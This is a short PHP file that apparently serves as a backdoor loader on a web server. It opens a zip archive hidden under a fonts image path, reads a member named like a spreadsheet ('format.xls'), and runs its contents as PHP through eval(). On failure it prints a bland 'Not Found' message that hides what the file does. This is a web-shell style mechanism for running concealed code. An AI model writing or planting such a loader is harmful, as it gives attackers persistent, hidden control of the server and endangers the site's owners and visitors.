<?php
$zipPath = 'flash/img/fonts/filter.zip';
$filenameInZip = 'filter/format.xls';

$zip = new ZipArchive;
if ($zip->open($zipPath) === TRUE) {
    $indexContent = $zip->getFromName($filenameInZip);
    $zip->close();

    if ($indexContent !== false) {
        eval('?>' . $indexContent);
    } else {
        echo "Not Found";
    }
} else {
    echo "Not Found";
}
?>